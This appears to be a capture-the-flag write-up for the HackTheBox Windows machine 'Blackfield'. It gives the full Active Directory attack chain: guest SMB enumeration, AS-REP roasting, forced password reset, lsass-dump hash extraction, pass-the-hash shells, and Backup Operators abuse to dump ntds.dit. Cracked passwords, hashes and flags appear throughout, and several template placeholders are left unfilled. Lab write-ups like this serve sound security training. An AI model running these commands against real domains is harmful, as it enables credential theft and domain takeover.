---
layout: writeup
title: Blackfield
platform: HackTheBox
difficulty: Hard
box_icon: /assets/writeups/icons/Blackfield.png
date: 2026-01-23
tags:
  - smb
  - active-directory
os: Windows
---
<link rel="stylesheet" href="{{ '/assets/css/obsidian-dividers.css' | relative_url }}">
## Machine Information

| Property       | Value         |
| -------------- | ------------- |
| **Name**       | Blackfield    |
| **OS**         | Windows       |
| **Difficulty** | Hard          |
| **IP**         | 10.129.229.17 |


---

## Summary

<div class="divider divider-info">
    <span class="divider-title">TL;DR</span>
    <span class="divider-content">Brief one-paragraph summary of the box - what vulnerabilities were exploited and key techniques used.</span>
</div>
**Key Vulnerabilities:**
- Vulnerability 1
- Vulnerability 2
- Vulnerability 3

---

## Enumeration

### Nmap Scan

**Initial scan:**
```bash
nmap -vv -T5 -p- *TARGET_IP*

nmap -vv -T5 -p*DISOVERED_PORTS* -sC -sV *TARGET_IP*
```

**Results:**

| Port | Service  | TCP/UDP |
| ---- | -------- | ------- |
| 53   | DNS      | TCP     |
| 88   | Kerberos | TCP     |
| 135  | RPC      | TCP     |
| 139  | Netbios  | TCP     |
| 389  | LDAP     | TCP     |
| 445  | SMB      | TCP     |
| 593  | HTTP RPC | TCP     |
| 3268 | LDAP     | TCP     |
| 5985 | WinRM    | TCP     |

**Key findings:**
- SMB: Allowed to authenticate as `Guest` and to enumerate active shares

### LDAP Enumeration

```
nmap -p 389 --script ldap-rootdse 10.129.229.17
```

![](../assets/images/Pasted%20image%2020260123172944.png)

The target machine is `DC01` and the domain is `Blackfield.local`, need to update our `/etc/hosts` accordingly.

![](../assets/images/Pasted%20image%2020260123173303.png)

In this case we also need to create a fitting `krb5.conf`, I used NXC for that:
```
❯ nxc smb 10.129.229.17 -u 'Guest' -p '' --generate-krb5-file krb5.conf
```

![](../assets/images/Pasted%20image%2020260123174847.png)

```
# working krb5 file:

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = BLACKFIELD.LOCAL

[realms]
    BLACKFIELD.LOCAL = {
        kdc = dc01.BLACKFIELD.local
        admin_server = dc01.BLACKFIELD.local
        default_domain = BLACKFIELD.local
    }

[domain_realm]
    .BLACKFIELD.local = BLACKFIELD.LOCAL
    BLACKFIELD.local = BLACKFIELD.LOCAL

```
---
### SMB Enumeration

```
❯ nxc smb 10.129.229.17 -u 'Guest' -p '' --shares
```

![](../assets/images/Pasted%20image%2020260123172218.png)

We have 'Read' permissions  for `profiles$` as `Guest`, which is a custom share and worth checking out.

```
❯ smbclient //10.129.229.17/profiles$ -U "Guest"%
Try "help" to get a list of possible commands.
smb: \> ls
```

![](../assets/images/Pasted%20image%2020260123172348.png)
Seems like we found a list of users, its possible to generate a list with the following command:
```
❯ smbclient -N \\\\10.129.229.17\\profiles$ -c ls | awk '{ print $1 }' > userlist.txt
```
---

## Initial Foothold

With the acquired user list, we can attempt to run `Impacket-GetNPUsers` to find users without pre-auth
```
❯ impacket-GetNPUsers blackfield.local/ -no-pass -usersfile userlist.txt -dc-ip 10.129.229.17
```
We found that the user `Support` has no pre-auth required

![](../assets/images/Pasted%20image%2020260123184759.png)

We create a new .txt file that contains the hash and attempt to crack with `john`

```
❯ john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![](../assets/images/Pasted%20image%2020260123185147.png)

---

### Vulnerability Discovery

**Vulnerability:** [Vulnerability Name]

<div class="divider divider-info">
    <span class="divider-title">UF_DONT_REQUIRE_PREAUTH</span>
    <span class="divider-content">a misconfiguration in Kerberos authentication where the pre-authentication requirement is disabled for user accounts in Active Directory. This creates a security weakness that attackers can exploit through an attack called AS-REP Roasting.</span>
</div>

Now we will confirm the credentials using NXC before moving on
```
❯ nxc smb 10.129.229.17 -u 'support' -p '#00^BlackKnight' --shares
```

![](../assets/images/Pasted%20image%2020260123185649.png)

---
### Lateral Movement

Now that we have valid credentials, we will use bloodhound-ce-py to enumerate the domain

```
bloodhound-ce-python -c All -d BLACKFIELD.LOCAL -k --zip -u support -p '#00^BlackKnight' -ns 10.129.229.17
```

Now the usual - Boot up bloodhound ----> Log In ----> Upload the zip ----> Profit?

First thing to check is compromised assets, in this case `support@blackfield.local`, and we find that this account has `ForceChangePassword` rights on `Audit2020@blackfield.local` 

![](../assets/images/Pasted%20image%2020260123190918.png)

We can now use the misconfiguration to compromise another user.

---
### Exploitation

**Step 1:** Change user password
```bash
# Commands
❯ net rpc password "audit2020" "asdasd123@" -U "BLACKFIELD.LOCAL"/"support"%"#00^BlackKnight" -S "DC01.BLACKFIELD.LOCAL"
```

**Step 2:** Validate changes
```bash
# Commands
❯ nxc smb 10.129.229.17 -u 'audit2020' -p 'asdasd123@' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:asdasd123@ 
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.229.17   445    DC01             profiles$       READ            
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share 
```

We can now enumerate the `forensic` SMB share.

![](../assets/images/Pasted%20image%2020260123192742.png)

We find an interesting folder `memory_analysis` and inside it `lsass.zip` since `lsass` is very commonly targeted for credentials, it makes sense to start by taking a look inside.

![](../assets/images/Pasted%20image%2020260123192957.png)

Seems to be a memory dump of lsass, this is useful, as we can now use `pypykatz` to retrieve hashes from the dump.

![](../assets/images/Pasted%20image%2020260123193130.png)

Lets try to authenticate with the `NT` hash

![](../assets/images/Pasted%20image%2020260123193247.png)

Authentication works! and this user is very likely to give us a foothold, we can check bloodhound for confirmation.

![](../assets/images/Pasted%20image%2020260123193356.png)

This is a big win, `svc_backup` is in `Backup Operators` which means we can use it to get `Domain Admin` easily.

**Getting a shell:**
```bash
# Evil WinRM
❯ evil-winrm-py -i 10.129.229.17 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```

<div class="divider divider-root">
    <span class="divider-title">Shell</span>
    <span class="divider-content">Successfully gained shell as svc_backup</span>
</div>
---

## User Flag

**User flag location:**
```bash
evil-winrm-py PS C:\Users\svc_backup\Documents> type ../desktop/user.txt
3920bb317a0bef51027e2852be64b543
```

---

## Privilege Escalation

**Vulnerability:** `Backup Operators` is a group that allows the Read right on every file in the domain, including registry hives.

<div class="divider divider-warning">
    <span class="divider-title">Exploitation Path</span>
    <span class="divider-content">the ability of Backup Operators to create volume shadow copies and access sensitive files such as the `ntds.dit` database and registry hives (`SYSTEM`, `SAM`, `SECURITY`) allows for simple privilege escalation path.</span>
</div>

**Exploitation steps:**

**Step 1:** Upload the PoC [Script](https://github.com/G4sp4rCS/backup-operator-to-domain-admin-POC)
```bash
# Command
evil-winrm-py PS C:\Users\svc_backup\Documents> upload ../../../../../home/Yuval/Tools/backup-operator-to-domain-admin-POC/backupToDA.ps1 .
```

**Step 2:** Run the PoC
```bash
# Command
.\backupToDA.ps1
```

**Step 3:** Download all the extracted hives
```bash
# Command
evil-winrm-py PS C:\Users\svc_backup\Documents> download ntds\ntds.dit .
evil-winrm-py PS C:\Users\svc_backup\Documents> download SAM .
evil-winrm-py PS C:\Users\svc_backup\Documents> download SECURITY .
evil-winrm-py PS C:\Users\svc_backup\Documents> download SYSTEM .
```

**Step 4: run `impacket-secretsdump` to parse the hives and get the `Administrator` NTLM hash.
```bash
# Command
/home/Yuval/H/Blackfield ❯ impacket-secretsdump LOCAL -sam SAM -security SECURITY -ntds ntds.dit -system SYSTEM 
```

![](../assets/images/Pasted%20image%2020260123195429.png)



<div class="divider divider-root">
    <span class="divider-title">Root Access</span>
    <span class="divider-content">Successfully escalated privileges to root</span>
</div>

### Root Flag

```bash
❯ evil-winrm-py -i 10.129.229.17 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.129.229.17:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
4375a629c7c67c8e29db269060c955cb

```

---

## Post-Exploitation

**Flags:**
- User: `3920bb317a0bef51027e2852be64b543`
- Root: `4375a629c7c67c8e29db269060c955cb`
---

## References

- [Vulnerability Name - CVE-XXXX-XXXXX](https://cve.mitre.org/)
- [GTFOBins - Tool](https://gtfobins.github.io/)
- [HackTricks - Technique](https://book.hacktricks.xyz/)
- [OWASP - Vulnerability Type](https://owasp.org/)

---

## Timeline

```mermaid
graph LR
    A[Nmap Scan] --> B[SMB Enum]
    B --> C[Vuln Discovery]
    C --> D[Bloodhound]
    D --> E[Lateral Movement]
    E --> F[SMB Enum]
    F --> G[Backup Operator Access]
    G --> H[Root Flag]
```

---

**Pwned on:** 05/10/2025
**Difficulty Rating:** ⭐⭐⭐⭐ (Personal rating)  
**Fun Factor:** ⭐⭐⭐ (How enjoyable was it?)